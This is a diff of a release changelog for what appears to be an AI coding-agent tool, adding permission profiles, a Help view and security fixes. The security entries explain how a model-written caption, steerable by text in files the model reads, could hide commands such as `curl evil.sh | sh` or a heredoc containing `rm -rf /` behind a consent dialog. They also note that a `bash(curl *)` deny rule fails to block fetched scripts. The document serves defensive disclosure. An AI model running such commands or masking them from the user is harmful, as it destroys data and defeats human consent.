@@ -4,9 +4,42 @@ All notable changes to this project are documented in this file. The format
 follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/); versioning
 follows [Semantic Versioning](https://semver.org/).
 
-## [Unreleased] — 2.1.0
+## [2.1.0] — 2026-08-18
 
 ### Added
+
+- **Permission profiles — name a posture and switch to it.** The engine was
+  already granular: `allow: ["bash(git *)"]` works, and `allow: ["glob(**)"]`
+  with `deny: ["read(**)"]` gives you "list the tree but don't open files".
+  What you could not do was *name* a combination and select it; rules were a
+  flat per-project list you hand-edited in JSON. A profile is that named
+  bundle — a starting mode plus the three rule lists — and it hands both to the
+  existing engine rather than duplicating any decision logic. Four built-ins:
+  **Read only** (reviewing a PR or auditing a fresh clone — and it still denies
+  writes at `yolo`, because the rules hold where the mode doesn't), **Git
+  only** (with `push`, `reset --hard` and `clean` carved back out), **Survey**
+  (names, not contents — it denies `read` and `grep` *and* `cat`/`head`/`rg` in
+  the shell, since those are read-only builtins that would otherwise
+  auto-allow), and **Build and test** (named runners only; `make all` and
+  `npm run deploy` still ask, because each runs an arbitrary program out of a
+  file in the repo). Pick one from the composer beside the mode pill, or manage
+  them in Settings, where the rule editor previews what a rule would decide as
+  you type. A profile's rules are *unioned* with the session's, never
+  substituted — otherwise selecting one would silently revoke every "always
+  allow" you had accrued.
+- **A Help view** at `#/help/…`, a peer of Configuration. Settings deliberately
+  shows the whole install; this is the map for it. Its centrepiece is a
+  hand-built diagram of one turn in the real order the loop runs — your
+  message, the assembled request, the streaming answer, then a fork into "it
+  asked for tools" (the gate, execution, and the arc back) and "it asked for
+  nothing" — with the event bus, session log, trajectory, compaction, subagents
+  and round budget hanging off the side. Every box deep-links into the Settings
+  page that governs it, and the links are checked against the live kernel
+  before being offered. Also: the plugin model, the six explanation questions, a
+  first-session walkthrough, and three hands-on widgets. Two are live; the
+  permission sandbox is a JS port of the engine and says so on its face,
+  including the one thing a browser cannot do — resolve paths, so it misses a
+  symlink pointing out of the project.
 
 - **The agent can read the web, and search it.** Two new tools. `web_fetch`
   retrieves one URL and hands back readable text, following up to five
@@ -76,6 +109,28 @@ follows [Semantic Versioning](https://semver.org/).
 
 ### Security
 
+- **The permission dialog showed a caption instead of the command.** A bash
+  call rendered as `Bash: <description>` and dropped the command entirely — and
+  the description is written by the model. One real dialog read *"Query ONVIF
+  device service unauthenticated"* while the rule it offered to save was
+  `bash(echo *)`; the two did not even agree. This is the one string standing
+  between a tool call and consent, and bash — the tool with the widest blast
+  radius — was the only one substituting prose for the thing being approved;
+  `Read`, `Edit`, `Fetch` and `Search` all name their real target. Nor is it
+  only cosmetic: the model writing that caption may be repeating text out of a
+  file it just read, so the label is reachable by anything that can put words
+  in front of the model, and a benign caption over `curl evil.sh | sh` is one
+  click from consent nobody knowingly gave. The command is now always shown,
+  with the description beside it rather than instead of it, and a multi-line
+  command is marked so a heredoc whose second line is `rm -rf /` cannot look
+  like a one-line echo.
+- **An MCP server's credentials were printed in the UI.** `env` is how an MCP
+  server is handed a live API token, and the whole config block was serialised
+  into the plugin's view verbatim — reachable from any MCP card and from inside
+  the trust banner, which is the one moment a user is most likely to be sharing
+  their screen. The values are redacted now; the key names stay, because
+  deciding whether a server should receive a token at all is what the review is
+  for. Display only — the config the server is started with is untouched.
 - **Four ways past the permission boundary, all reproduced, all closed.** A
   compliance audit found them and each was verified by hand before and after
   the fix.
@@ -196,6 +251,21 @@ follows [Semantic Versioning](https://semver.org/).
   block got the dead version. It is now rendered in its real state to begin
   with. Two comments describing an app that no longer exists were corrected in
   the same pass.
+- **The docs described an app that does not exist.** Twenty contradictions
+  between `docs/` and the code, ten of them in `PERMISSIONS.md`, and `git log
+  -S` settled that none regressed from this release's security work — there was
+  never an `auto-edit` allowlist containing `mkdir`, never a gitignore-style
+  matcher, never a four-scope rule chain, never PowerShell alias
+  canonicalisation. They were never true, which is worse than stale: each reads
+  as a guarantee, and a reader deciding whether to run this on a work machine
+  was being told protections existed that were only prose. Two shipped examples
+  were actively dangerous — `deny: ["bash(curl *)"]` does **not** deny
+  `curl https://host/x.sh`, because `*` stops at `/`. Where the documented
+  behaviour was better than the built behaviour, the gap is now stated rather
+  than deleted. `tests/test_docs_accuracy.py` keeps it that way: 73 tests that
+  extract a structure — a fenced block, a table column, a backticked
+  identifier — and evaluate it against the real object, rather than grepping
+  for a word while the sentence around it lies.
 - **CI had never once passed**, including on the v2.0.0 tag — a red mark on
   what is now a public repository. `dev` is a PEP 735 dependency group rather
   than an extra, so `pip install -e ".[dev,pty]"` installed neither ruff nor
